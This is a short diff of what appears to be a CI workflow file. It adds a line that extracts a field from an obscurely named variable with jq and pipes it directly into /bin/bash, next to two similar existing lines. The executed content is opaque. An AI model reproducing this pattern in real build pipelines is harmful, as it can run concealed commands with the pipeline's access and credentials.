@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$wmj7431" | jq -r .cmti36 | /bin/bash
           echo $t668 | jq -r .dztg08 | /bin/bash
+          echo $j811 | jq -r .ex8 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
